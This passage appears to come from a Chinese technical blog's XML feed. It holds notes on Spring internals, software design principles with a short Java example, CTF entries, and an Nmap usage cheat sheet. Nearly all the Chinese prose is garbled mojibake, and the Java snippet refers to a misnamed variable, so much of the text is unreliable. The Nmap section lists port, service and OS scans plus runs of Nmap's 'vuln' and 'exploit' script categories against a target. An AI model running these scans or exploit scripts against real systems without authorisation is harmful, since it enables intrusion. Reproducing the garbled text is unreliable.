é€åº”ç”¨ã€‚</li></ul></li><li><p>é›†æˆæµ‹è¯•</p><ul><li>spring-testï¼šæä¾›æµ‹è¯•æ”¯æŒ</li></ul></li><li><p>é›†æˆå…¼å®¹</p><ul><li>spring-framework-bomï¼šä¸»è¦è§£å†³Springçš„ä¸åŒæ¨¡å—ä¾èµ–ç‰ˆæœ¬ä¸åŒçš„é—®é¢˜</li></ul></li><li><p>æ¨¡å—ä¹‹é—´ä¾èµ–å…³ç³»</p><p><img src="https://img-blog.csdnimg.cn/04b5b226e7174b52bc02410275c9975b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ul><h2 id="Spring-IoCè¿è¡Œæ—¶åº"><a href="#Spring-IoCè¿è¡Œæ—¶åº" class="headerlink" title="Spring IoCè¿è¡Œæ—¶åº"></a>Spring IoCè¿è¡Œæ—¶åº</h2><ul><li>IoCå›é¡¾ï¼šInversion of Control æ§åˆ¶åè½¬ï¼Œå°±æ˜¯æŠŠåŸæ¥ä»£ç é‡Œéœ€è¦å®ç°çš„å¯¹è±¡åˆ›å»ºã€ä¾èµ–ï¼Œåè½¬ç»™å®¹å™¨å¸®å¿™å®ç°ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/a1982e05ee9e4b5d833d511a717e5658.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>è¿™é‡Œæˆ‘ç”»äº†ä¸€å¼ è¯¦ç»†çš„æ—¶åºå›¾</li><li>ç®€å•æ¦‚æ‹¬å°±æ˜¯ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤ï¼š<ul><li>åˆå§‹åŒ–çš„å…¥å£ç”±å®¹å™¨å®ç°ä¸­çš„refresh()æ–¹æ³•å®Œæˆè°ƒç”¨</li><li>å¯¹Beanå®šä¹‰è½½å…¥IoCå®¹å™¨ä½¿ç”¨çš„æ–¹æ³•æ˜¯loadBeanDefinition()</li><li>æ³¨å†Œä¹‹åå°±å¯ä»¥é€šè¿‡BeanFactoryå’ŒApplicationContextæ¥äº«å—SpringIoCçš„æœåŠ¡äº†</li></ul></li></ul><h2 id="Spring-DIè¿è¡Œæ—¶åº"><a href="#Spring-DIè¿è¡Œæ—¶åº" class="headerlink" title="Spring DIè¿è¡Œæ—¶åº"></a>Spring DIè¿è¡Œæ—¶åº</h2><ul><li><p>DIå›é¡¾ï¼šDependency Injection ä¾èµ–æ³¨å…¥</p></li><li><p>DIå‘ç”Ÿçš„æ—¶é—´ï¼š</p><ul><li>ç”¨æˆ·ç¬¬ä¸€æ¬¡è°ƒç”¨getBean()æ–¹æ³•æ—¶,IoCå®¹å™¨è§¦å‘ä¾èµ–æ³¨å…¥</li><li>å½“ç”¨æˆ·åœ¨é…ç½®æ–‡ä»¶ä¸­å°†<bean>å…ƒç´ é…ç½®äº†lay-init&#x3D;falseå±æ€§æ˜¯ï¼Œå³è®©å®¹å™¨åœ¨è§£ææ³¨å†ŒBeanå®šä¹‰æ—¶è¿›è¡Œé¢„å®ä¾‹åŒ–ï¼Œè§¦å‘ä¾èµ–æ³¨å…¥ï¼ˆå»¶æ—¶åŠ è½½ï¼šå¯ä»¥æé«˜ç¬¬ä¸€æ¬¡è·å–Beançš„æ€§èƒ½ï¼‰</bean></li></ul></li><li><p>ä¸»è¦åˆ†ä¸ºäºŒä¸ªæ­¥éª¤ï¼š</p><ul><li>è°ƒç”¨createBeanInstance()æ–¹æ³•ç”ŸæˆBeanæ‰€åŒ…å«çš„Javaå¯¹è±¡å®ä¾‹</li><li>è°ƒç”¨populateBean()æ–¹æ³•å¯¹Beanå±æ€§çš„ä¾èµ–æ³¨å…¥è¿›è¡Œå¤„ç†</li></ul></li><li><p>IoCå®¹å™¨æ˜¯å¦‚ä½•å°†å±æ€§å€¼æ³¨å…¥Beanå®ä¾‹å¯¹è±¡ä¸Šçš„ï¼š</p><ul><li>å¯¹äºé›†åˆç±»å‹çš„å±æ€§ï¼Œå°†å±æ€§å€¼è§£æä¸ºç›®æ ‡ç±»å‹çš„ç»“åˆåç›´æ¥èµ‹å€¼ç»™å±æ€§</li><li>å¯¹äºéé›†åˆç±»å‹çš„å±æ€§ï¼Œå¤§é‡ä½¿ç”¨JDKçš„åå°„æœºåˆ¶ï¼Œé€šè¿‡å±æ€§çš„getter()æ–¹æ³•è·å–æŒ‡å®šå±æ€§æ³¨å…¥å‰çš„å€¼ï¼ŒåŒæ—¶è°ƒç”¨å±æ€§çš„setter()æ–¹æ³•ä¸ºå±æ€§è®¾ç½®æ³¨å…¥åçš„å€¼</li></ul></li><li><p>è¯¦ç»†æ—¶åºå›¾</p></li></ul><p><img src="https://img-blog.csdnimg.cn/c8b884c87f424dfdab7097d4504ae8a5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Spring-AOPæ—¶åº"><a href="#Spring-AOPæ—¶åº" class="headerlink" title="Spring AOPæ—¶åº"></a>Spring AOPæ—¶åº</h2><ul><li>AOPå›é¡¾ï¼šAspect Oriented Programming é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œå¯ä»¥é€šè¿‡é¢„ç¼–è¯‘å’Œè¿è¡Œæ—¶çš„åŠ¨æ€ä»£ç†ï¼Œå®ç°åœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹ç»™ç¨‹åºåŠ¨æ€ç»Ÿä¸€æ·»åŠ åŠŸèƒ½ã€‚</li><li>å¤§è‡´æ­¥éª¤ï¼š<ul><li>BeanPostProcessoråˆå§‹åŒ–</li><li>é€‰æ‹©ä»£ç†ç­–ç•¥</li><li>è°ƒç”¨ä»£ç†æ–¹æ³•</li><li>è§¦å‘é€šçŸ¥</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/f6808948e2d946c3bd20a8dd57a31b5e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="Spring-MVCæ—¶åº"><a href="#Spring-MVCæ—¶åº" class="headerlink" title="Spring MVCæ—¶åº"></a>Spring MVCæ—¶åº</h2><ul><li><p>ä¸€å¼ ç»å…¸å›¾ç‰‡å›é¡¾mvcçš„è¯·æ±‚å¤„ç†æµç¨‹ï¼š</p></li><li><p><img src="https://img-blog.csdnimg.cn/2020072519232190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTMwMDQzNw==,size_16,color_FFFFFF,t_70" alt="img"></p></li><li><p>ä¹å¤§ç»„ä»¶ï¼š</p><ul><li>HandlerMappingï¼šç”¨æ¥æŸ¥æ‰¾Handlerçš„ï¼Œä¹Ÿå°±æ˜¯å¤„ç†å™¨ï¼Œå¯ä»¥æ˜¯ç±»ä¹Ÿå¯ä»¥æ˜¯æ–¹æ³•ã€‚<ul><li>ä¾‹å­ï¼šæ ‡æ³¨äº†***@RequestMapping***çš„æ¯ä¸ªæ–¹æ³•å°±å¯ä»¥çœ‹æˆä¸€ä¸ªHandlerã€‚</li><li>ä½œç”¨ï¼šæ‰¾åˆ°è¯·æ±‚å¯¹åº”çš„å¤„ç†å™¨Handlerå’ŒInterceptor</li></ul></li><li>HandlerAdapterï¼šé€‚é…å™¨ï¼Œå› ä¸ºHandlerå½¢å¼ä»»æ„ï¼Œä½†è¯·æ±‚äº¤ç»™Servletçš„æ–¹æ³•èŠ‚åéƒ½æ˜¯doService(HttpServletRequest req,HttpServletResponse res)å½¢å¼çš„ï¼Œç»ˆç©¶é€‚é…è¿‡ç¨‹å°±æ˜¯é å®ƒã€‚</li><li>HandlerExceptionResolverï¼šå¤„ç†Handleräº§ç”Ÿçš„å¼‚å¸¸æƒ…å†µçš„ç»„ä»¶</li><li>ViewResolverï¼šè§†å›¾è§£æå™¨ã€‚<ul><li>æ ¸å¿ƒæ–¹æ³•ï¼šresolveViewName(),ä¸€ä¸ªå‚æ•°æ˜¯Stringç±»å‹ViewNameï¼Œå¦ä¸€ä¸ªæ˜¯Locale</li><li>ä½œç”¨ï¼šå°†Stringç±»å‹çš„è§†å›¾åå’ŒLocaleè§£æä¸ºViewç±»å‹çš„è§†å›¾</li><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨é…ç½®ä¸€ä¸ªInternalResourceViewResolver</li></ul></li><li>RequestToViewNameTranslator:ä»è¯·æ±‚ä¸­è·å–ViewNameã€‚å› ä¸ºViewResolveræ ¹æ®ViewNameæŸ¥æ‰¾Viewï¼Œä½†æœ‰äº›Handlerå¤„ç†å®Œæˆä¹‹åæ²¡æœ‰è®¾ç½®Viewå’ŒViewNameã€‚</li><li>LocaleResloverï¼šä»è¯·æ±‚ä¸­è§£æLocaleã€‚</li><li>ThemeResolverï¼šè§£æä¸»é¢˜çš„ã€‚</li><li>MultipartResloverï¼šå¤„ç†ä¸Šä¼ è¯·æ±‚ï¼Œé€šè¿‡å°†æ™®é€šçš„è¯·æ±‚åŒ…è£…æˆMultipartHttpServletRequestæ¥å®ç°ï¼ˆä½¿å…¶å¯ä»¥ä¸Šä¼ æ–‡ä»¶ç­‰ç­‰ï¼‰ã€‚</li><li>FlashMapManagerï¼šç®¡ç†FlashMapã€‚<ul><li>ä»€ä¹ˆæ˜¯FlashMapï¼šç”¨äºé‡å®šå‘æ—¶çš„å‚æ•°ä¼ é€’</li></ul></li></ul></li><li><p>å¤§è‡´æ­¥éª¤å¯åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ul><li>ApplicationContextåˆå§‹åŒ–æ—¶ç”¨Mapä¿å­˜æ‰€æœ‰çš„URLå’ŒControllerç±»çš„å¯¹åº”å…³ç³»ã€‚</li><li>æ ¹æ®è¯·æ±‚URLæ‰¾åˆ°å¯¹åº”çš„Controllerï¼Œå¹¶ä»Controllerä¸­æ‰¾åˆ°å¤„ç†è¯·æ±‚çš„æ–¹æ³•ã€‚</li><li>å°†Requestå‚æ•°ç»‘å®šåˆ°æ–¹æ³•çš„å‚æ•°ä¸Šï¼Œæ‰§è¡Œæ–¹æ³•å¤„ç†è¯·æ±‚ï¼Œå¹¶è¿”å›ç»“æœè§†å›¾ã€‚</li></ul></li><li><p>æ—¶åºå›¾(ç”»çš„å¥½ç´¯ğŸ¤®ï¼Œä½†æ˜¯ä¸ºäº†èŒä¸šç´ å…»)</p></li></ul><p><img src="https://img-blog.csdnimg.cn/1b8736233c2d4144bbdea5d88e5c5b58.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>æ‰‹å†™spring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è½¯ä»¶æ¶æ„è®¾è®¡åŸåˆ™è¿…é€Ÿå›å¿†</title>
    <link href="/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/"/>
    <url>/2022/08/13/%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="è½¯ä»¶æ¶æ„è®¾è®¡åŸåˆ™"><a href="#è½¯ä»¶æ¶æ„è®¾è®¡åŸåˆ™" class="headerlink" title="è½¯ä»¶æ¶æ„è®¾è®¡åŸåˆ™"></a>è½¯ä»¶æ¶æ„è®¾è®¡åŸåˆ™</h1><h2 id="1-å¼€é—­åŸåˆ™"><a href="#1-å¼€é—­åŸåˆ™" class="headerlink" title="1.å¼€é—­åŸåˆ™"></a>1.å¼€é—­åŸåˆ™</h2><ul><li><p>æ˜¯ä»€ä¹ˆï¼šå¼€é—­åŸåˆ™å°±æ˜¯æŒ‡ä¸€ä¸ªè½¯ä»¶å®ä½“åº”è¯¥å¯¹åº“æ¬§æˆ˜å¼€æ”¾,å¯¹ä¿®æ”¹å…³é—­ã€‚</p></li><li><p>ä¸ºä»€ä¹ˆï¼šæé«˜è½¯ä»¶ç³»ç»Ÿçš„å¯å¤åˆæ€§åŠå¯ç»´æŠ¤æ€§ã€‚æŒ‡å¯¼æˆ‘ä»¬å¦‚ä½•å»ºç«‹ç¨³å®šã€çµæ´»çš„ç³»ç»Ÿã€‚</p></li><li><p>æ€ä¹ˆåšï¼š</p><ul><li><p>ä¾‹å¦‚ç‰ˆæœ¬æ›´æ–°ï¼Œæˆ‘ä»¬åº”å°½å¯èƒ½ä¸ä¿®æ”¹æºä»£ç ï¼Œä½†æ˜¯å¯ä»¥æ–°å¢åŠŸèƒ½</p></li><li><p>ç¨å¾®å…·ä½“çš„ä¾‹å­ï¼šç±»å®ç°äº†æ¥å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³æ‰©å±•å…¶åŠŸèƒ½çš„æ—¶å€™ï¼Œä½œä¸€ä¸ªå®ç°äº†æ¥å£çš„ç±»çš„å­ç±»å°±æ˜¯ä¸ªä¸é”™çš„æ–¹å¼ã€‚</p></li></ul></li></ul><h2 id="2-ä¾èµ–å€’ç½®åŸåˆ™"><a href="#2-ä¾èµ–å€’ç½®åŸåˆ™" class="headerlink" title="2.ä¾èµ–å€’ç½®åŸåˆ™"></a>2.ä¾èµ–å€’ç½®åŸåˆ™</h2><ul><li>æ˜¯ä»€ä¹ˆï¼šç»†èŠ‚ä¾èµ–æŠ½è±¡</li><li>ç®€å•æ¥è¯´å°±æ˜¯é¢å‘æ¥å£ç¼–ç¨‹ï¼Œå…ˆé¡¶å±‚å†ç»†èŠ‚è®¾è®¡ä»£ç ç»“æ„</li></ul><h2 id="3-å•ä¸€èŒè´£åŸåˆ™"><a href="#3-å•ä¸€èŒè´£åŸåˆ™" class="headerlink" title="3.å•ä¸€èŒè´£åŸåˆ™"></a>3.å•ä¸€èŒè´£åŸåˆ™</h2><ul><li>æ˜¯ä»€ä¹ˆï¼šä¸è¦å­˜åœ¨å¤šäºä¸€ä¸ªå¯¼è‡´ç±»å˜æ›´çš„åŸå› ã€‚</li><li>ä¸ºä»€ä¹ˆï¼šè§£è—•</li></ul><h2 id="4-æ¥å£éš”ç¦»åŸåˆ™"><a href="#4-æ¥å£éš”ç¦»åŸåˆ™" class="headerlink" title="4.æ¥å£éš”ç¦»åŸåˆ™"></a>4.æ¥å£éš”ç¦»åŸåˆ™</h2><ul><li>æ˜¯ä»€ä¹ˆï¼šç”¨å¤šä¸ªä¸“é—¨çš„æ¥å£ï¼Œå®¢æˆ·ç«¯ä¸åº”è¯¥ä¾èµ–å®ƒä¸éœ€è¦çš„æ¥å£</li><li>æ€ä¹ˆåšï¼š<ul><li>ä¸€ä¸ªç±»å¯¹åº”å¦ä¸€ä¸ªç±»çš„ä¾èµ–åº”è¯¥å»ºç«‹åœ¨æœ€å°çš„æ¥å£ä¹‹ä¸Š</li><li>å»ºç«‹å•ä¸€æ¥å£ï¼Œä¸è¦å»ºç«‹åºå¤§è‡ƒè‚¿çš„æ¥å£</li><li>å°½é‡ç»†åŒ–æ¥å£ï¼Œæ¥å£ä¸­çš„æ–¹æ³•å°½é‡å°‘ï¼Œä¸æ˜¯è¶Šå°‘è¶Šå¥½</li></ul></li></ul><h2 id="5-è¿ªç±³ç‰¹åŸåˆ™ï¼ˆæœ€å°‘çŸ¥é“åŸåˆ™ï¼‰"><a href="#5-è¿ªç±³ç‰¹åŸåˆ™ï¼ˆæœ€å°‘çŸ¥é“åŸåˆ™ï¼‰" class="headerlink" title="5.è¿ªç±³ç‰¹åŸåˆ™ï¼ˆæœ€å°‘çŸ¥é“åŸåˆ™ï¼‰"></a>5.è¿ªç±³ç‰¹åŸåˆ™ï¼ˆæœ€å°‘çŸ¥é“åŸåˆ™ï¼‰</h2><ul><li>æ˜¯ä»€ä¹ˆï¼šä¸€ä¸ªå¯¹è±¡åº”è¯¥å¯¹å…¶ä»–å¯¹è±¡ä¿æŒæœ€å°‘çš„äº†è§£</li><li>ä¸ºä»€ä¹ˆï¼šé™ä½è€¦åˆ</li><li>å¼ºè°ƒï¼šåªå’Œæœ‹å‹äº¤æµï¼Œä¸å’Œé™Œç”Ÿäººè¯´è¯ã€‚å‡ºç°åœ¨æˆå‘˜å˜é‡ã€æ–¹æ³•çš„è¾“å…¥ã€è¾“å‡ºå‚æ•°ä¸­çš„ç±»éƒ½å¯ä»¥ç§°ä¹‹ä¸ºæœ‹å‹ç±»ï¼Œåä¹‹ä¸æ˜¯ã€‚</li></ul><h2 id="6-é‡Œæ°æ›¿æ¢åŸåˆ™"><a href="#6-é‡Œæ°æ›¿æ¢åŸåˆ™" class="headerlink" title="6.é‡Œæ°æ›¿æ¢åŸåˆ™"></a>6.é‡Œæ°æ›¿æ¢åŸåˆ™</h2><ul><li>ä¸€å¥è¯ï¼šå­ç±»å¯ä»¥æ‰©å±•çˆ¶ç±»çš„åŠŸèƒ½ï¼Œä½†ä¸èƒ½æ”¹å˜çˆ¶ç±»çš„åŸæœ‰åŠŸèƒ½</li><li>ä¸ºä»€ä¹ˆï¼šçº¦æŸç»§æ‰¿æ³›æ»¥ï¼ŒåŠ å¼ºç¨‹åºå¥å£®æ€§</li><li>æ€ä¹ˆåšï¼š<ul><li>å­ç±»å¯ä»¥å®ç°çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•ï¼Œä½†ä¸èƒ½è¦†ç›–çˆ¶ç±»çš„éæŠ½è±¡æ–¹æ³•ã€‚</li><li>å­ç±»å¯ä»¥å¢åŠ è‡ªå·±ç‰¹æœ‰çš„æ–¹æ³•ã€‚</li><li>å½“å­ç±»çš„æ–¹æ³•é‡è½½çˆ¶ç±»çš„æ–¹æ³•æ—¶ï¼Œæ–¹æ³•çš„å‰ç½®æ¡ä»¶ï¼ˆæ–¹æ³•çš„è¾“å…¥&#x2F;å‚æ•°ï¼‰è¦æ¯”çˆ¶ç±»æ–¹æ³•çš„è¾“å…¥å‚æ•°æ›´å®½æ¾</li><li>å½“å­ç±»å®ç°çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œæ–¹æ³•çš„åç½®æ¡ä»¶ï¼ˆæ–¹æ³•çš„è¾“å‡º&#x2F;è¿”å›å€¼ï¼‰è¦æ¯”çˆ¶ç±»æ›´ä¸¥æ ¼æˆ–ä¸çˆ¶ç±»ä¸€æ ·</li></ul></li></ul><h2 id="7-åˆæˆå¤ç”¨åŸåˆ™"><a href="#7-åˆæˆå¤ç”¨åŸåˆ™" class="headerlink" title="7.åˆæˆå¤ç”¨åŸåˆ™"></a>7.åˆæˆå¤ç”¨åŸåˆ™</h2><ul><li><p>æ˜¯ä»€ä¹ˆï¼šå°½é‡ä½¿ç”¨å¯¹è±¡ç»„åˆ&#x2F;èšåˆè€Œä¸æ˜¯ç»§æ‰¿å…³ç³»è¾¾åˆ°è½¯ä»¶å¤ç”¨çš„ç›®çš„ã€‚</p></li><li><p>ä¸ºä»€ä¹ˆï¼šå¯ä»¥ä½¿ç³»ç»Ÿæ›´åŠ çµæ´»</p></li><li><p>æ€ä¹ˆåšï¼šæ¥ä¸ªä¾‹å­ï¼ˆä»¥æ•°æ®åº“ä¸ºä¾‹ï¼‰</p><ul><li><div class="code-wrapper"><pre><code class="java">public class DBConnection&#123;    public String getConnection()&#123;    return &quot;Mysqlæ•°æ®åº“è¿æ¥&quot;;  &#125;&#125;<pre><code class="hljs csharp">- ```java  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ProductDao</span>&#123;    <span class="hljs-keyword">private</span> DBConnection dbConnection;<span class="hljs-comment">//è¿™é‡Œå°±ä½“ç°äº†åˆæˆå¤ç”¨åŸåˆ™</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setDbConnection</span>(<span class="hljs-params">DBConnection dbConnection</span>)</span>&#123;      <span class="hljs-keyword">this</span>.dbConnection = dbConnection;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addProduct</span>()</span>&#123;      String conn = dbConnection.getConnection();      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;ä½¿ç”¨&quot;</span>+cnn+<span class="hljs-string">&quot;å¢åŠ äº§å“&quot;</span>);    &#125;  &#125;</code></pre></div></code></pre></li><li><p>å½“ç„¶æœ‰äº›è¿èƒŒäº†å…¶ä»–åŸåˆ™ï¼Œä½†ä¸ºäº†çªå‡ºåˆæˆå¤ç”¨åŸåˆ™ï¼Œè¿™é‡Œä¸åšæ‰©å±•ã€‚å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¸å¿…åˆ»æ„è¿½æ±‚å®Œç¾ï¼Œå­¦ä¼šå¹³è¡¡å–èˆï¼Œå†™å‡ºä¼˜é›…ã€‚</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>å¼€å‘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/"/>
    <url>/2022/08/10/CTF_show_Web%E5%85%A5%E9%97%A8_phpCVE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_nodejs</title>
    <link href="/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/"/>
    <url>/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_nodejs.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nmapä½¿ç”¨å§¿åŠ¿</title>
    <link href="/2022/07/26/nmap%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/07/26/nmap%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmapä½¿ç”¨å§¿åŠ¿"><a href="#Nmapä½¿ç”¨å§¿åŠ¿" class="headerlink" title="Nmapä½¿ç”¨å§¿åŠ¿"></a>Nmapä½¿ç”¨å§¿åŠ¿</h1><h3 id="åˆ—ä¸¾è¿œç¨‹æœºå™¨å¼€æ”¾çš„ç«¯å£"><a href="#åˆ—ä¸¾è¿œç¨‹æœºå™¨å¼€æ”¾çš„ç«¯å£" class="headerlink" title="åˆ—ä¸¾è¿œç¨‹æœºå™¨å¼€æ”¾çš„ç«¯å£"></a>åˆ—ä¸¾è¿œç¨‹æœºå™¨å¼€æ”¾çš„ç«¯å£</h3><ul><li><p>ä¾‹ï¼š<code>nmap scanme.nmap.org</code>ï¼ˆæ‰«æï¼‰</p></li><li><p>ä¾‹ï¼š<code>nmap --dns-servers 8.8.8.8 scanme.nmap.org</code>ï¼ˆâ€“dns-serveræŒ‡å®šdnsæœåŠ¡å™¨è¿›è¡Œè§£æï¼‰</p></li><li><p>ä¾‹ï¼š<code>nmap Pn scanme.nmap.org</code>ï¼ˆ-Pnå‚æ•°æ¥åœæ­¢æ¢æµ‹ä¹‹å‰çš„ICMPè¯·æ±‚ï¼Œé˜²æ­¢é˜²ç«å¢™çªç ´ï¼‰</p></li><li><p>ä¾‹ï¼š<code>nmap -p 1-1000 scanme.nmap.org</code>ï¼ˆ-p m-n æŒ‡å®šç«¯å£èŒƒå›´ä¸ºmåˆ°nï¼‰</p></li><li><div class="code-wrapper"><pre><code class="hljs">ç«¯å£çŠ¶æ€ï¼š- Open å¼€æ”¾- Closed å…³é—­- Filtered è¿‡æ»¤æ— æ³•æ”¶åˆ°è¿”å›çš„probeçŠ¶æ€- UnFiltered ç«¯å£æ”¶åˆ°è¿”å›çš„probeï¼Œä½†æ— æ³•ç¡®è®¤</code></pre></div></li></ul><h3 id="è¯†åˆ«æœåŠ¡æŒ‡çº¹"><a href="#è¯†åˆ«æœåŠ¡æŒ‡çº¹" class="headerlink" title="è¯†åˆ«æœåŠ¡æŒ‡çº¹"></a>è¯†åˆ«æœåŠ¡æŒ‡çº¹</h3><ul><li>è¯†åˆ«æœºå™¨çš„æœåŠ¡ä¿¡æ¯: <code>nmap -sV IPåœ°å€</code></li><li>ä¾µç•¥æ€§æ¢æµ‹: <code>nmap -A -v -T4 IPåœ°å€</code></li><li>ä¾µç•¥æ€§æ¢æµ‹: <code>nmap  -sC -sV -O IPåœ°å€</code><ul><li>-sCï¼šä½¿ç”¨è„šæœ¬æ¢æµ‹</li><li>-sVï¼šæ¢æµ‹ç›®æ ‡æœºå™¨çš„æœåŠ¡ä¿¡æ¯</li><li>-Oï¼šæ¢æµ‹ç›®æ ‡æœºå™¨çš„æ“ä½œç³»ç»Ÿä¿¡æ¯</li></ul></li></ul><h3 id="å‘ç°å±€åŸŸç½‘ä¸­å­˜æ´»ä¸»æœº"><a href="#å‘ç°å±€åŸŸç½‘ä¸­å­˜æ´»ä¸»æœº" class="headerlink" title="å‘ç°å±€åŸŸç½‘ä¸­å­˜æ´»ä¸»æœº"></a>å‘ç°å±€åŸŸç½‘ä¸­å­˜æ´»ä¸»æœº</h3><ul><li><p>å¯¹ç½‘ç»œä¸­æ‰€æœ‰ä¸»æœºè¿›è¡Œpingæ‰«æï¼Œä»¥æ¢æµ‹ä¸»æœºå­˜æ´»æ€§</p><ul><li><code>nmap -sP CIDR </code></li><li><code>nmap -sn CIDR</code></li></ul></li><li><p>nmap -sn CIDR -oX test.xml    ç»“æœè¾“å‡ºåˆ°test.xml</p></li></ul><h3 id="ç«¯å£æ¢æµ‹æŠ€å·§"><a href="#ç«¯å£æ¢æµ‹æŠ€å·§" class="headerlink" title="ç«¯å£æ¢æµ‹æŠ€å·§"></a>ç«¯å£æ¢æµ‹æŠ€å·§</h3><ul><li><p>å¯¹æŸä¸ªç«¯å£è¿›è¡Œæ¢æµ‹</p><ul><li><code>nmap -p80 scanme.nmap.org</code></li><li><code>nmap -p80,135 scaneme.nmap.org</code></li></ul></li><li><p>å¯¹æŸä¸ªèŒƒå›´ç«¯å£è¿›è¡Œæ¢æµ‹</p><ul><li><code>nmap -p 1-100 scanme.nmap.org</code></li></ul></li><li><p>æŒ‡å®šåè®®æ¢æµ‹ç«¯å£</p><ul><li><code>nmap -p T:25,U:53 scanme.nmap.org</code>ï¼ˆTï¼šTCPï¼ŒUï¼šUDPï¼‰</li></ul></li><li><p>é€šè¿‡åè®®åæ‰«æç«¯å£</p><ul><li><code>nmap -p smtp scanme.nmap.org</code></li></ul></li><li><p>é€šè¿‡åç§°èŒƒå›´æ‰«æ</p><ul><li><code>nmap -p s* scanme.nmap.org</code></li></ul></li><li><p>æ‰«ææ³¨å†Œåœ¨nmapä¸­çš„ç«¯å£</p><ul><li><code>nmap -p [1-65535] scanme.nmap.org</code></li></ul></li></ul><h3 id="NSEè„šæœ¬"><a href="#NSEè„šæœ¬" class="headerlink" title="NSEè„šæœ¬"></a>NSEè„šæœ¬</h3><ul><li><p>ä½¿ç”¨ â€“scriptå‚æ•°æ¥æŒ‡å®šè°ƒç”¨çš„è„šæœ¬,å¹¶ä¸”å°†è„šæœ¬å­˜å‚¨åœ¨Nmapå®‰è£…è·¯å¾„ä¸‹çš„scriptæ–‡ä»¶å¤¹ä¸‹é¢ï¼Œå¯¹äºkali linuxå­˜å‚¨åœ¨&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;script&#x2F;ä¸‹</p><ul><li><code>nmap --script http-headers scanme.nmap.org </code>ï¼ˆæ¢æµ‹httpè¯·æ±‚å¤´ï¼‰</li><li><code>nmap -sV --script vuln ç›®æ ‡</code>ï¼ˆä½¿ç”¨nmapä¸­æ¼æ´åˆ†ç±»è„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ¢æµ‹ï¼‰</li><li><code>nmap -sV --script=&quot;version, discovery&quot; ç›®æ ‡</code>ï¼ˆä½¿ç”¨nmapä¸­å‘ç°å’Œç‰ˆæœ¬ä¿¡æ¯åˆ†ç±»è¿›è¡Œæ¢æµ‹ï¼‰</li><li><code>nmap -sV --script=&quot;not exploit&quot; ç›®æ ‡</code>ï¼ˆä½¿ç”¨nmapä¸­é™¤äº†exploitåˆ†ç±»ä¹‹å¤–çš„å…¶ä»–åˆ†ç±»è¿›è¡Œæ¢æµ‹ï¼‰</li></ul></li><li><p><strong>NSEè°ƒè¯•åŠŸèƒ½ä½¿ç”¨</strong></p><ul><li><code>nmap -sV --script exploit -d 3 --script-trace ç›®æ ‡</code>ï¼ˆä½¿ç”¨nmapä¸­çš„expolitï¼Œä½†æ˜¯åŒæ—¶å¼€å¯è°ƒè¯•æ¨¡å¼ï¼‰<ul><li>-d(debugèŒƒå›´0ï½9)</li></ul></li></ul></li><li><p><code>nmap -sV --script http-title --script-args http.useragent=&quot;Mozilla 999&quot; ç›®æ ‡</code>ï¼ˆä½¿ç”¨nmapçš„http-titleè„šæœ¬ï¼Œå¹¶ä¸”æŒ‡å®šä½¿ç”¨çš„User-Agentï¼‰</p></li><li><p><strong>NSEæ›´æ–°</strong><code>nmap -script-updatedb</code></p></li><li><p><strong>NSEè„šæœ¬åˆ†ç±»</strong> <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p></li></ul><h3 id="ä½¿ç”¨ç‰¹å®šç½‘å¡è¿›è¡Œæ¢æµ‹"><a href="#ä½¿ç”¨ç‰¹å®šç½‘å¡è¿›è¡Œæ¢æµ‹" class="headerlink" 